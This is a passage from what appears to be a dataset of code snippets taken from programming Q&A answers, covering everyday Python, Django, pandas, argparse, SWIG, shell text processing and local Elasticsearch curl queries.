        b = np.copy(identity)
        pivots = zeros(n_eq, np.intc)
        results = lapack_lite.dgesv(n_eq, n_rhs, a, n_eq, pivots, b, n_eq, 0)
        if results['info'] &gt; 0:
            raise LinAlgError('Singular matrix')
        return b

    return array([lapack_inverse(a) for a in A])


%timeit -n 20 aI11 = slow_inverse(A)
%timeit -n 20 aI12 = fast_inverse(A)
%timeit -n 20 aI13 = fast_inverse2(A)
%timeit -n 20 aI14 = faster_inverse(A)
</snippet></ROW><ROW><id>11999063</id><snippet>20 loops, best of 3: 45.1 ms per loop
20 loops, best of 3: 38.1 ms per loop
20 loops, best of 3: 38.9 ms per loop
20 loops, best of 3: 13.8 ms per loop
</snippet></ROW><ROW><id>11999178</id><snippet>extra</snippet></ROW><ROW><id>11999178</id><snippet>titles = Title.objects.all()
ordered_query = titles.extra(select={
                'ordering':"(
                    case when status='Default' then 1 
                         when status='WIP' then 2
                         when status='Complete' then 3
                    end)"
                }).order_by('ordering', 'title')
</snippet></ROW><ROW><id>11999300</id><snippet>sys.argv</snippet></ROW><ROW><id>11999300</id><snippet>sys.argv</snippet></ROW><ROW><id>11999300</id><snippet>*arg</snippet></ROW><ROW><id>11999300</id><snippet>*arg</snippet></ROW><ROW><id>11999300</id><snippet>sys.argv</snippet></ROW><ROW><id>11999300</id><snippet>*</snippet></ROW><ROW><id>11999300</id><snippet>sys.argv</snippet></ROW><ROW><id>11999300</id><snippet>'hello','salut','hola'</snippet></ROW><ROW><id>11999300</id><snippet>'hello','salut','hola'</snippet></ROW><ROW><id>11999300</id><snippet>sys.argv</snippet></ROW><ROW><id>11999300</id><snippet>sys.argv</snippet></ROW><ROW><id>11999300</id><snippet>python trial.py 'hello' 'salut' 'hola'
</snippet></ROW><ROW><id>11999300</id><snippet>'hello'</snippet></ROW><ROW><id>11999300</id><snippet>hello</snippet></ROW><ROW><id>11999300</id><snippet>'hello'</snippet></ROW><ROW><id>11999300</id><snippet>hello</snippet></ROW><ROW><id>11999300</id><snippet>he'll'o</snippet></ROW><ROW><id>11999300</id><snippet>'hello','salut','hola'</snippet></ROW><ROW><id>11999330</id><snippet>parse_loly</snippet></ROW><ROW><id>11999330</id><snippet>from scrapy.contrib.spiders import CrawlSpider, Rule
from scrapy.contrib.linkextractors.sgml import SgmlLinkExtractor

class SpiderSpider(CrawlSpider):
    name = "lolies"
    allowed_domains = ["domain.com"]
    start_urls = ['http://www.domain.com/directory/lol2/']
    rules = (
        Rule(SgmlLinkExtractor(allow=('\w+$', ))), 
        Rule(SgmlLinkExtractor(allow=('\w+/\d+$', ))),
        Rule(SgmlLinkExtractor(allow=('\d+$',)), callback='parse_loly'),
    )

    def parse_loly(self, response):
        print 'Hi this is the loly page %s' % response.url
        return None
</snippet></ROW><ROW><id>11999399</id><snippet>i</snippet></ROW><ROW><id>11999399</id><snippet>append</snippet></ROW><ROW><id>11999399</id><snippet>def all_gt(nums, n):
    i = []
    for c in nums:
        if c &gt; n:
            i.append(c)  ## &lt;----- note this
    return i
</snippet></ROW><ROW><id>11999399</id><snippet>            i += [c]
</snippet></ROW><ROW><id>11999440</id><snippet>pwd ; ( cd /tmp ; pwd ) ; pwd
</snippet></ROW><ROW><id>11999440</id><snippet>echo '(foo)'
</snippet></ROW><ROW><id>11999588</id><snippet>--input-files foo.txt bar.txt</snippet></ROW><ROW><id>11999588</id><snippet>--provision</snippet></ROW><ROW><id>11999588</id><snippet>action</snippet></ROW><ROW><id>11999588</id><snippet>store_true</snippet></ROW><ROW><id>11999588</id><snippet>nargs</snippet></ROW><ROW><id>11999588</id><snippet>argparse</snippet></ROW><ROW><id>11999588</id><snippet>ArgumentParser</snippet></ROW><ROW><id>11999588</id><snippet>ArgumentParser</snippet></ROW><ROW><id>11999588</id><snippet>dest='bar'</snippet></ROW><ROW><id>11999588</id><snippet>--foo</snippet></ROW><ROW><id>11999693</id><snippet>getdefaultencoding</snippet></ROW><ROW><id>11999693</id><snippet>SyntaxError: Non-ASCII character '\x87' in file ...
</snippet></ROW><ROW><id>11999693</id><snippet># coding: utf8
value = '國華'
</snippet></ROW><ROW><id>11999693</id><snippet>SyntaxError: 'utf8' codec can't decode byte 0x87 in position 9: invalid start byte
</snippet></ROW><ROW><id>11999693</id><snippet># coding: utf8
value = '國華'
print value,repr(value)
value = u'國華'
print value,repr(value)
</snippet></ROW><ROW><id>11999693</id><snippet>鍦嬭彲 '\xe5\x9c\x8b\xe8\x8f\xaf'
國華 u'\u570b\u83ef'
</snippet></ROW><ROW><id>11999693</id><snippet># coding: cp936
value = '國華'
print value,repr(value)
value = u'國華'
print value,repr(value)
</snippet></ROW><ROW><id>11999693</id><snippet>國華 '\x87\xf8\xc8A'
國華 u'\u570b\u83ef'
</snippet></ROW><ROW><id>11999693</id><snippet>UnicodeEncodeError</snippet></ROW><ROW><id>12000778</id><snippet>codecs.open()</snippet></ROW><ROW><id>12000778</id><snippet>unicode</snippet></ROW><ROW><id>12001086</id><snippet>__repr__</snippet></ROW><ROW><id>12001086</id><snippet>to_string</snippet></ROW><ROW><id>12001086</id><snippet>pandas.set_printoptions()</snippet></ROW><ROW><id>12001086</id><snippet>In [64]: df
Out[64]:
                                                   A    B
a  this is a very long string, longer than the defau  bar
b                                                foo  baz

In [65]: pandas.set_printoptions(max_colwidth=100)

In [66]: df
Out[66]:
                                                                      A    B
a  this is a very long string, longer than the default max_column width  bar
b                                                                   foo  baz
</snippet></ROW><ROW><id>12001663</id><snippet>__file__</snippet></ROW><ROW><id>12001663</id><snippet>__file__</snippet></ROW><ROW><id>12001663</id><snippet>import os

class Foo:
    def __init__(self):
        self.myLoc = os.path.abspath(__file__)

f = Foo()
print f.myLoc
</snippet></ROW><ROW><id>12002011</id><snippet>import sys,  traceback

filename = 'tempfile'

def tail(filename):
    fd = open(filename)
    while True:
        try:
            line = fd.readline()
        except KeyboardInterrupt:
            print 'keyboard interrupt here'
            yield fd
        if not line:
            continue
        else:
            yield line


try:
    genObj = tail(filename) 
    valfromgen= genObj.next()
    while valfromgen:       
        if isinstance(valfromgen, file):
            print 'Closing this file now as `tail` yielded a file descriptor'
            valfromgen.close()
            genObj.close()
            break
        print 'Yielded line: ', valfromgen
        valfromgen= genObj.next()

    print 'Just in order to check that things are in order, the following line will raise StopIteration. If it raises, it means we are good.'
    print genObj.next()
except:
    traceback.print_exc()
</snippet></ROW><ROW><id>12002109</id><snippet>gtk.FileFilter</snippet></ROW><ROW><id>12002109</id><snippet>filechooserdialog.add_filter()</snippet></ROW><ROW><id>12002109</id><snippet>filename = filechooserdialog.get_filename()
if not filename.endswith('.xyz'):
    filename += '.xyz'
</snippet></ROW><ROW><id>12002134</id><snippet>import matplotlib.pyplot as plt
import numpy as np


fig = plt.figure()
ax = plt.axes()

ax.set_aspect(1)
theta = np.linspace(-np.pi, np.pi, 200)
plt.plot(np.sin(theta), np.cos(theta))

plt.show()
</snippet></ROW><ROW><id>12002134</id><snippet>import matplotlib.patches as mpatches
import matplotlib.pyplot as plt
import numpy as np


fig = plt.figure()
ax = plt.axes()
patch = mpatches.Circle((325, 245), 180, alpha=0.5, transform=None)
fig.artists.append(patch)


plt.show()
</snippet></ROW><ROW><id>12002328</id><snippet>sed 's/"//g' old_file.txt | awk '...' &gt; new_file.txt
</snippet></ROW><ROW><id>12002328</id><snippet>awk</snippet></ROW><ROW><id>12002328</id><snippet>cut</snippet></ROW><ROW><id>12002328</id><snippet>sed 's/"//g' old_file.txt | cut -d' ' -f1-2,4 &gt; new_file.txt
</snippet></ROW><ROW><id>12002328</id><snippet>tee</snippet></ROW><ROW><id>12002328</id><snippet>sed 's/"//g' old_file.txt | tee inter_file.txt | cut -d' ' -f1-2,4 &gt; new_file.txt
</snippet></ROW><ROW><id>12002328</id><snippet>inter_file.txt</snippet></ROW><ROW><id>12002328</id><snippet>new_file.txt</snippet></ROW><ROW><id>12002328</id><snippet>ionice</snippet></ROW><ROW><id>12002328</id><snippet>ionice -c3 -p$$
</snippet></ROW><ROW><id>12002328</id><snippet>ionice -c3 ./yourscript.sh
</snippet></ROW><ROW><id>12002328</id><snippet>time.sleep()</snippet></ROW><ROW><id>12002569</id><snippet>import numpy as np
from scipy import stats

dataset1 = np.random.randn(100)  #random distribution
dataset2 = np.random.randn(100) 

res = stats.ks_2samp(dataset1, dataset2)

print res
</snippet></ROW><ROW><id>12002569</id><snippet>(0.089999999999999969, 0.79418377128477335)
</snippet></ROW><ROW><id>12002609</id><snippet>country</snippet></ROW><ROW><id>12002609</id><snippet>country</snippet></ROW><ROW><id>12002609</id><snippet>DE</snippet></ROW><ROW><id>12002609</id><snippet>curl -XGET 'http://127.0.0.1:9200/_all/_search?pretty=1'  -d '
{
   "query" : {
      "constant_score" : {
         "filter" : {
            "term" : {
               "country" : "DE"
            }
         }
      }
   }
}
'
</snippet></ROW><ROW><id>12002609</id><snippet>DE</snippet></ROW><ROW><id>12002609</id><snippet>FR</snippet></ROW><ROW><id>12002609</id><snippet>curl -XGET 'http://127.0.0.1:9200/_all/_search?pretty=1'  -d '
{
   "query" : {
      "constant_score" : {
         "filter" : {
            "terms" : {
               "country" : [
                  "DE",
                  "FR"
               ]
            }
         }
      }
   }
}
'
</snippet></ROW><ROW><id>12002609</id><snippet>curl -XGET 'http://127.0.0.1:9200/_all/_search?pretty=1'  -d '
{
   "query" : {
      "filtered" : {
         "filter" : {
            "terms" : {
               "country" : [
                  "DE",
                  "FR"
               ]
            }
         },
         "query" : {
            "text" : {
               "address.street" : "bonjour"
            }
         }
      }
   }
}
'
</snippet></ROW><ROW><id>12002660</id><snippet>licenses</snippet></ROW><ROW><id>12002660</id><snippet>licenses = []
...
</snippet></ROW><ROW><id>12002660</id><snippet>licenses.append(dict(...))
</snippet></ROW><ROW><id>12002761</id><snippet>#!/bin/tcsh

# count-rows.csh

mysql -h 127.0.0.1 -D tpcw -u root &lt;&lt;EOF
select count(*) from $1;
exit
EOF
</snippet></ROW><ROW><id>12002761</id><snippet>mysql</snippet></ROW><ROW><id>12003293</id><snippet>is_locked</snippet></ROW><ROW><id>12003293</id><snippet>async_work</snippet></ROW><ROW><id>12003293</id><snippet>--concurrency</snippet></ROW><ROW><id>12003293</id><snippet>$ celery worker --concurrency=1
</snippet></ROW><ROW><id>12003647</id><snippet>[ANY]</snippet></ROW><ROW><id>12003647</id><snippet>ANY</snippet></ROW><ROW><id>12003647</id><snippet>int[4] bar() {
  static int data[4];
  return data;
}
</snippet></ROW><ROW><id>12003647</id><snippet>int bar()[4] {
  static int data[4];
  return data;
}
</snippet></ROW><ROW><id>12003647</id><snippet>int (*bar())[4] {
  static int data[4] = {1,2,3,4};
  return &amp;data;
}
</snippet></ROW><ROW><id>12003647</id><snippet>%array_class</snippet></ROW><ROW><id>12003647</id><snippet>%module test

%inline %{
  struct foo {
    int member;
  };

  struct foo *bar() {
    struct foo *arr = malloc(sizeof(struct foo) * 4);
    for (int i = 0; i &lt; 4; ++i) 
      arr[i].member = i;
    return arr;
  }
%}

%include &lt;carrays.i&gt;
%array_class(struct foo, fooArray);
</snippet></ROW><ROW><id>12003647</id><snippet>Python 3.2.3 (default, May  3 2012, 15:54:42) 
[GCC 4.6.3] on linux2
Type "help", "copyright", "credits" or "license" for more information.
&gt;&gt;&gt; import test
&gt;&gt;&gt; arr = test.fooArray.frompointer(test.bar())
&gt;&gt;&gt; arr
&lt;test.fooArray; proxy of &lt;Swig Object of type 'fooArray *' at 0xb6f332a8&gt; &gt;
&gt;&gt;&gt; arr[0]
&lt;test.foo; proxy of &lt;Swig Object of type 'struct foo *' at 0xb6f33038&gt; &gt;
&gt;&gt;&gt; arr[1]
&lt;test.foo; proxy of &lt;Swig Object of type 'struct foo *' at 0xb6f33380&gt; &gt;
&gt;&gt;&gt; arr[2]
&lt;test.foo; proxy of &lt;Swig Object of type 'struct foo *' at 0xb6f33398&gt; &gt;
&gt;&gt;&gt; arr[3]
&lt;test.foo; proxy of &lt;Swig Object of type 'struct foo *' at 0xb6f330c8&gt; &gt;
&gt;&gt;&gt; 
</snippet></ROW><ROW><id>12003647</id><snippet>bar()</snippet></ROW><ROW><id>12003647</id><snippet>%pythonappend bar() %{
    # Wrap it automatically
    val = fooArray.frompointer(val)
%}
</snippet></ROW><ROW><id>12003647</id><snippet>Python 3.2.3 (default, May  3 2012, 15:54:42) 
[GCC 4.6.3] on linux2
Type "help", "copyright", "credits" or "license" for more information.
&gt;&gt;&gt; import test
&gt;&gt;&gt; test.bar()[1].member
1
&gt;&gt;&gt; arr = test.bar()
&gt;&gt;&gt; arr[3].member
3
</snippet></ROW><ROW><id>12003647</id><snippet>%newobject</snippet></ROW><ROW><id>12003647</id><snippet>%module test

%pythonappend bar() %{
    # Wrap it automatically
    newval = fooArray.frompointer(val)
    newval.ptr_retain = val
    val = newval
%}

%newobject bar();

%inline %{
  struct foo {
    int member;
  };

  struct foo *bar() {
    struct foo *arr = malloc(sizeof(struct foo) * 4);
    for (int i = 0; i &lt; 4; ++i) 
      arr[i].member = i;
    return arr;
  }
%}

%include &lt;carrays.i&gt;
%array_class(struct foo, fooArray);
</snippet></ROW><ROW><id>12003647</id><snippet>struct foo*</snippet></ROW><ROW><id>12003785</id><snippet>whos</snippet></ROW><ROW><id>12003785</id><snippet>whos</snippet></ROW><ROW><id>12004153</id><snippet>pip install git+git://github.com/mikemaccana/python-docx.git
</snippet></ROW><ROW><id>12004153</id><snippet>pip install PIL
pip install lxml
pip install python-dateutil
</snippet></ROW><ROW><id>12004692</id><snippet>#Editbox Eclipse Plugin Settings
#Fri Aug 17 12:58:32 CEST 2012
HighlightOne=true
FillGradient=false
FillSelected=true
RoundBox=true
BorderColorType=1
Name=Default
ExpandBox=false
BorderDrawLine=true
FillOnMove=true
Alpha=0
HighlightWidth=1
BorderWidth=1
HighlightColor=000000
BorderColor=00bbbb
FillKeyModifier=Alt
HighlightColorType=3
FillGradientColor=e1e1d0
Builder=Text2
HighlightDrawLine=true
FillSelectedColor=e1e1d0
BorderLineStyle=0
Colors=ffffff
HighlightLineStyle=0
NoBackground=false
CirculateLevelColors=false
</snippet></ROW><ROW><id>12004841</id><snippet>Dataset.title</snippet></ROW><ROW><id>12004841</id><snippet>Dataset</snippet></ROW><ROW><id>12004841</id><snippet>dataset = Dataset(title="Sheet name")
</snippet></ROW><ROW><id>12005240</id><snippet>,</snippet></ROW><ROW><id>12005240</id><snippet>split(',')</snippet></ROW><ROW><id>12005240</id><snippet>def extract(source):
    for line in iter(source):
        _, start, end, _, _, _, _, _, _, text = line.strip().split(',', 9)
        yield start, end, text
</snippet></ROW><ROW><id>12005240</id><snippet>xml = '&lt;p begin="{start}" end="{end}"&gt;{text}&lt;/p&gt;'
def to_xml(start, end, text):
    return xml.format(start=start, end=end, text=text)
</snippet></ROW><ROW><id>12005240</id><snippet>with open('input.ass') as infile, open('output.xml', 'w') as outfile:
    for start, end, text in extract(infile):
        outfile.write(to_xml(start, end, text) + '\n')
</snippet></ROW><ROW><id>12005480</id><snippet>str_token = str(token)
if str_token in thread_queue:
   prog, total = thread_queue[str_token].getValue() # problematic line !
else:
   # value isn't there, do something else 
</snippet></ROW><ROW><id>12005645</id><snippet>def get_digits(str1):
    c = ""
    for i in str1:
        if i.isdigit():
            c += i
    return c
</snippet></ROW><ROW><id>12005645</id><snippet>''.join(c for c in my_string if c.isdigit())
</snippet></ROW><ROW><id>12005847</id><snippet>mongodb://server1,server2:27017,server2:27018</snippet></ROW><ROW><id>12005847</id><snippet>Connection("morton.local", replicaset='foo')
Connection([u'morton.local:27019', 'morton.local:27017', u'morton.local:27018'])
Connection("morton.local:27018", replicaset='foo')
Connection([u'morton.local:27019', u'morton.local:27017', 'morton.local:27018'])
Connection("morton.local", 27019, replicaset='foo')
Connection(['morton.local:27019', u'morton.local:27017', u'morton.local:27018'])
Connection(["morton.local:27018", "morton.local:27019"])
Connection(['morton.local:27019', u'morton.local:27017', 'morton.local:27018'])
Connection("mongodb://morton.local:27017,morton.local:27018,morton.local:27019")
Connection(['morton.local:27019', 'morton.local:27017', 'morton.local:27018'])
</snippet></ROW><ROW><id>12006065</id><snippet>num = num + i
</snippet></ROW><ROW><id>12006065</id><snippet>num += i
</snippet></ROW><ROW><id>12006065</id><snippet>sum</snippet></ROW><ROW><id>12006065</id><snippet>range</snippet></ROW><ROW><id>12006065</id><snippet>sum( x for x in range(0,1000,5) if x % 3 == 0 )
                            #^only take every 5th element (0, 5, 10, 15 ...)
                                    #^ Also only take elements divisible by 3
</snippet></ROW><ROW><id>12006065</id><snippet>range</snippet></ROW><ROW><id>12006065</id><snippet>xrange</snippet></ROW><ROW><id>12006065</id><snippet>if x % 3 == 0</snippet></ROW><ROW><id>12006065</id><snippet>if not x % 3</snippet></ROW><ROW><id>12006082</id><snippet>urls.py</snippet></ROW><ROW><id>12006082</id><snippet>if settings.DEBUG:
    urlpatterns += patterns('',
            (r'^static/media/(?P&lt;path&gt;.*)$', 'django.views.static.serve', {'document_root': settings.MEDIA_ROOT, 'show_indexes':True}),
        )
    urlpatterns += patterns('',
                 (r'^static/(?P&lt;path&gt;.*)$', 'django.views.static.serve', {'document_root': settings.STATIC_ROOT, 'show_indexes':True}),
            )
</snippet></ROW><ROW><id>12006386</id><snippet>man getrusage</snippet></ROW><ROW><id>12006386</id><snippet>ru_maxrss (since Linux 2.6.32)
    This is the maximum resident set size used (in kilobytes).
</snippet></ROW><ROW><id>12006678</id><snippet>class Actor(object):

  def __init__(self, **kwargs):
    self._image_getter = kwargs['image_getter']
    self.pos = kwargs['pos']
    ...

  def draw(self, surface):
    surface.blit(self._image_getter(), self.pos)
</snippet></ROW><ROW><id>12006678</id><snippet>image getter</snippet></ROW><ROW><id>12006678</id><snippet>class SurfaceCapsule (object):

    def __init__(self, resource_manager, key):
        self._res = resource_manager
        self._key = key

    def __call__(self):
        return self._res[self._key]
</snippet></ROW><ROW><id>12006678</id><snippet>actor = Actor(image=resource_manager[key])
</snippet></ROW><ROW><id>12006678</id><snippet>actor = Actor(image_getter=SurfaceCapsule(resource_manager, key))
</snippet></ROW><ROW><id>12006678</id><snippet>resource_manager</snippet></ROW><ROW><id>12006678</id><snippet>class RessourceManager(dict):

    def __getitem__(self, key):
        # implement lazy loading if you want, or load all images at startup
        # load surface is necessary, cache it, and return it

    def __load_surface_by_key(key):
        # load stuff
</snippet></ROW><ROW><id>12006678</id><snippet>clear()</snippet></ROW><ROW><id>12006678</id><snippet>class Actor(object):

  def __init__(self, **kwargs):
    self.image_key = kwargs['image_key']
</snippet></ROW><ROW><id>12006678</id><snippet>def draw(self):
    for actor in self._actors:
        self._screen.blit(resource_manager[actor.image_key], actor.pos)
</snippet></ROW><ROW><id>12006688</id><snippet># remember that `type` is actually a class like `str` and `int`
# so you can inherit from it
class UpperAttrMetaclass(type): 
    # __new__ is the method called before __init__
    # it's the method that creates the object and returns it
    # while __init__ just initializes the object passed as parameter
    # you rarely use __new__, except when you want to control how the object
    # is created.
    # here the created object is the class, and we want to customize it
    # so we override __new__
    # you can do some stuff in __init__ too if you wish
    # some advanced use involves overriding __call__ as well, but we won't
    # see this
    def __new__(upperattr_metaclass, future_class_name, 
                future_class_parents, future_class_attr):

        attrs = ((name, value) for name, value in future_class_attr.items() if not name.startswith('__'))
        uppercase_attr = dict((name.upper(), value) for name, value in attrs)

        return type(future_class_name, future_class_parents, uppercase_attr)
</snippet></ROW><ROW><id>12007296</id><snippet>select([sock],[],[],0)</snippet></ROW><ROW><id>12007385</id><snippet>cmath</snippet></ROW><ROW><id>12007385</id><snippet>phase</snippet></ROW><ROW><id>12007385</id><snippet>import cmath

def largest_spoke_angle(centre, peripheral):
     per_from_centre = [complex(z[0]-centre[0], z[1]-centre[1]) for z in peripheral]
     per_angles = [cmath.phase(z) for z in per_from_centre]
     per_angles.sort()

     differences = [ per_angles[n+1]-per_angles[n] for n in range(len(per_angles)-1)] \
                    + [per_angles[0] +2*cmath.pi - per_angles[-1]]

     return max(differences)#in radians

centre = (0.,0.)
peripheral = [(1.,2.),(3.,4.),(3.,5.)]
print largest_spoke_angle(centre, peripheral)
</snippet></ROW><ROW><id>12007497</id><snippet>best_estimator_</snippet></ROW><ROW><id>12007497</id><snippet>cPickle.dump(clf.best_estimator_, f)
</snippet></ROW><ROW><id>12007502</id><snippet>stacklevel</snippet></ROW><ROW><id>12007502</id><snippet>warnings.warn</snippet></ROW><ROW><id>12007574</id><snippet>In [193]: df
Out[193]:
   A  B  C  D
a  1  8  9  1
b  5  4  3  6
c  4  6  1  3
d  1  0  2  9

In [194]: df.divide(df.ix[0] / 100)
Out[194]:
     A    B           C    D
a  100  100  100.000000  100
b  500   50   33.333333  600
c  400   75   11.111111  300
d  100    0   22.222222  900
</snippet></ROW><ROW><id>12007707</id><snippet>&gt;&gt;&gt; words = ['hello', 'world', 'you', 'look', 'nice']
&gt;&gt;&gt; ', '.join('"{0}"'.format(w) for w in words)
'"hello", "world", "you", "look", "nice"'
</snippet></ROW><ROW><id>12007789</id><snippet>ns = parser.parse_args()
ns.extra_file = ns.extra_file if ns.extra_file else ns.filename
</snippet></ROW><ROW><id>12007859</id><snippet>nth</snippet></ROW><ROW><id>12007859</id><snippet>itertools</snippet></ROW><ROW><id>12007859</id><snippet>&gt;&gt;&gt; from itertools import permutations, islice
&gt;&gt;&gt; def nth(iterable, n, default=None):
        "Returns the nth item or a default value"
        return next(islice(iterable, n, None), default)

&gt;&gt;&gt; print nth(permutations(range(10), 10), 1000)
(0, 1, 2, 4, 6, 5, 8, 9, 3, 7)
</snippet></ROW><ROW><id>12007885</id><snippet>tempfile</snippet></ROW><ROW><id>12007885</id><snippet>time.time()</snippet></ROW><ROW><id>12007885</id><snippet>tempfile.py</snippet></ROW><ROW><id>12007885</id><snippet>tempfile</snippet></ROW><ROW><id>12007885</id><snippet>os.path.exists()</snippet></ROW><ROW><id>12007885</id><snippet>os.rename()</snippet></ROW><ROW><id>12007885</id><snippet>RenamedTemporaryFile</snippet></ROW><ROW><id>12007885</id><snippet>NamedTemporaryFile</snippet></ROW><ROW><id>12007885</id><snippet>import tempfile
import os

class RenamedTemporaryFile(object):
    """
    A temporary file object which will be renamed to the specified
    path on exit.
    """
    def __init__(self, final_path, **kwargs):
        tmpfile_dir = kwargs.pop('dir', None)

        # Put temporary file in the same directory as the location for the
        # final file so that an atomic move into place can occur.

        if tmpfile_dir is None:
            tmpfile_dir = os.path.dirname(final_path)

        self.tmpfile = tempfile.NamedTemporaryFile(dir=tmpfile_dir, **kwargs)
        self.final_path = final_path

    def __getattr__(self, attr):
        """
        Delegate attribute access to the underlying temporary file object.
        """
        return getattr(self.tmpfile, attr)

    def __enter__(self):
        self.tmpfile.__enter__()
        return self

    def __exit__(self, exc_type, exc_val, exc_tb):
        if exc_type is None:
            self.tmpfile.delete = False
            result = self.tmpfile.__exit__(exc_type, exc_val, exc_tb)
            os.rename(self.tmpfile.name, self.final_path)
        else:
            result = self.tmpfile.__exit__(exc_type, exc_val, exc_tb)

        return result
</snippet></ROW><ROW><id>12007885</id><snippet>with RenamedTemporaryFile('whatever') as f:
    f.write('stuff')
</snippet></ROW><ROW><id>12007907</id><snippet>QuerySet</snippet></ROW><ROW><id>12007907</id><snippet>Students.objects(name="Tom").distinct(field="class")
</snippet></ROW><ROW><id>12007958</id><snippet>module.ClassName.method_name</snippet></ROW><ROW><id>12007958</id><snippet>configobj.ConfigObj</snippet></ROW><ROW><id>12007958</id><snippet>x = a * b + c</snippet></ROW><ROW><id>12008221</id><snippet>...         r'(?:'
...             r'[a-z0-9]'  # first character of domain('-' not allowed)
...             r'(?:'
...                 r'[a-z0-0-]*'  #  characters in the middle of domain
...                 r'[a-z0-9]' #  last character of domain('-' not allowed)
...             r')*'
...             r'\.'  # dot before next part of domain name
...         r')+'
</snippet></ROW><ROW><id>12008221</id><snippet>...         r'(?:'
...             r'[a-z0-9]'  # first character of domain('-' not allowed)
...             r'[a-z0-0-]*'  #  characters in the middle of domain
...             r'(?&lt;=[a-z0-9])' #  last character of domain('-' not allowed)
...             r'\.'  # dot before next part of domain name
...         r')+'
</snippet></ROW><ROW><id>12008517</id><snippet>[random.choice(colors) for i in range(10)] #xrange for python2 compatability
</snippet></ROW><ROW><id>12008517</id><snippet>random.sample()</snippet></ROW><ROW><id>12008517</id><snippet>nrandom = 10
random.sample( colors*(nrandom//len(colors)+1), nrandom )  
</snippet></ROW><ROW><id>12009018</id><snippet>-X</snippet></ROW><ROW><id>12009018</id><snippet>add</snippet></ROW><ROW><id>12009018</id><snippet>search</snippet></ROW><ROW><id>12009018</id><snippet>&gt;&gt;&gt; # create the top-level parser
&gt;&gt;&gt; parser = argparse.ArgumentParser(prog='PROG')
&gt;&gt;&gt; parser.add_argument('--foo', action='store_true', help='foo help')
&gt;&gt;&gt; subparsers = parser.add_subparsers(help='sub-command help')
&gt;&gt;&gt;
&gt;&gt;&gt; # create the parser for the "a" command
&gt;&gt;&gt; parser_a = subparsers.add_parser('a', help='a help')
&gt;&gt;&gt; parser_a.add_argument('bar', type=int, help='bar help')
&gt;&gt;&gt;
&gt;&gt;&gt; # create the parser for the "b" command
&gt;&gt;&gt; parser_b = subparsers.add_parser('b', help='b help')
&gt;&gt;&gt; parser_b.add_argument('--baz', choices='XYZ', help='baz help')
&gt;&gt;&gt;
&gt;&gt;&gt; # parse some argument lists
&gt;&gt;&gt; parser.parse_args(['a', '12'])
Namespace(bar=12, foo=False)
&gt;&gt;&gt; parser.parse_args(['--foo', 'b', '--baz', 'Z'])
Namespace(baz='Z', foo=True)
</snippet></ROW><ROW><id>12009242</id><snippet>print content.read()
</snippet></ROW><ROW><id>12009242</id><snippet>dir(content)
</snippet></ROW><ROW><id>12009396</id><snippet>self</snippet></ROW><ROW><id>12009396</id><snippet>something_else(self, a, b)</snippet></ROW><ROW><id>12009396</id><snippet>something_else(a, b)</snippet></ROW><ROW><id>12009396</id><snippet>    class BAR():
        def __init__(self):
            self.foo1 = FOO()

    def something_else(self, a, b):
        self.foo1.do_something(a, b)
</snippet></ROW><ROW><id>12009396</id><snippet>a</snippet></ROW><ROW><id>12009396</id><snippet>b</snippet></ROW><ROW><id>12009396</id><snippet>this</snippet></ROW><ROW><id>12009396</id><snippet>self</snippet></ROW><ROW><id>12009396</id><snippet>foo1.an_attribute</snippet></ROW><ROW><id>12009396</id><snippet>function(arg)</snippet></ROW><ROW><id>12009396</id><snippet>class BAR():
    def __init__(self):
        self.foo1 = FOO()
</snippet></ROW><ROW><id>12009396</id><snippet>def __init__(self, baz):</snippet></ROW><ROW><id>12009396</id><snippet>baz</snippet></ROW><ROW><id>12009396</id><snippet>BAR</snippet></ROW><ROW><id>12009396</id><snippet>self.baz = baz</snippet></ROW><ROW><id>12009502</id><snippet>temp_pos = player.pos + (-1, -1) #move downleft one block
if player.pos != enemy.pos: #if the position is not occupied
    player.pos = temp_pos # move the player there.
else:
    #move player to another location and try again
</snippet></ROW><ROW><id>12009957</id><snippet>unittest</snippet></ROW><ROW><id>12009957</id><snippet>assertRaises</snippet></ROW><ROW><id>12009957</id><snippet>with self.assertRaises(PositionError):
    pos.offset = 0
</snippet></ROW><ROW><id>12010007</id><snippet># initialize a table somehow
table = QTableWidget(parent)
table.setRowCount(1)
table.setColumnCount(1)

# create an cell widget
btn = QPushButton(table)
btn.setText('12/1/12')
table.setCellWidget(0, 0, btn)
</snippet></ROW><ROW><id>12010007</id><snippet>def editItem(item):
    print 'editing', item.text()    

# initialize a table widget somehow
table = QTableWidget(parent)
table.setRowCount(1)
table.setColumnCount(1)

# create an item
item = QTableWidgetItem('12/1/12')
table.setItem(0, 0, item)

# if you don't want to allow in-table editing, either disable the table like:
table.setEditTriggers( QTableWidget.NoEditTriggers )

# or specifically for this item
item.setFlags( item.flags() ^ Qt.ItemIsEditable)

# create a connection to the double click event
table.itemDoubleClicked.connect(editItem)
</snippet></ROW><ROW><id>12010085</id><snippet>url(r'^(?P&lt;title&gt;[a-z]+)', 'pages.views.PageNameRequest')
</snippet></ROW><ROW><id>12010085</id><snippet>url(r'^(?P&lt;title&gt;[a-zA-Z_ ]+)', 'pages.views.PageNameRequest')
</snippet></ROW><ROW><id>12010085</id><snippet>_</snippet></ROW><ROW><id>12010277</id><snippet>django-classifieds</snippet></ROW><ROW><id>12010277</id><snippet>Field</snippet></ROW><ROW><id>12010277</id><snippet>FieldValue</snippet></ROW><ROW><id>12010277</id><snippet>django-classifieds</snippet></ROW><ROW><id>12010277</id><snippet>FIELD_CHOICES</snippet></ROW><ROW><id>12010277</id><snippet>django-classified</snippet></ROW><ROW><id>12010277</id><snippet>models.py</snippet></ROW><ROW><id>12010277</id><snippet>ForeignKey</snippet></ROW><ROW><id>12010277</id><snippet>photographer</snippet></ROW><ROW><id>12010277</id><snippet>A</snippet></ROW><ROW><id>12010277</id><snippet>Ad</snippet></ROW><ROW><id>12010277</id><snippet>fields_dict()</snippet></ROW><ROW><id>12010277</id><snippet>def fields_dict(self):
    fields_dict = {}
    fields_dict['title'] = self.title
    fields_dict['photographer'] = self.photographer

    for key, value in self.fields():
        fields_dict[key.name] = value.value

    return fields_dict
</snippet></ROW><ROW><id>12010859</id><snippet>import csv

def remove_quotes(s):
    return ''.join(c for c in s if c not in ('"', "'"))

with open("fixquote.csv","rb") as infile, open("fixed.csv","wb") as outfile:
    reader = csv.reader(infile)
    writer = csv.writer(outfile, quoting=csv.QUOTE_ALL)
    for line in reader:
        writer.writerow([remove_quotes(elem) for elem in line])
</snippet></ROW><ROW><id>12010859</id><snippet>~/coding$ cat fixed.csv 
"name of movie","starring","director","release year"
"dark knight rises","christian bale, anna hathaway","christopher nolan","2012"
"the dark knight","christian bale, heath ledger","christopher nolan","2008"
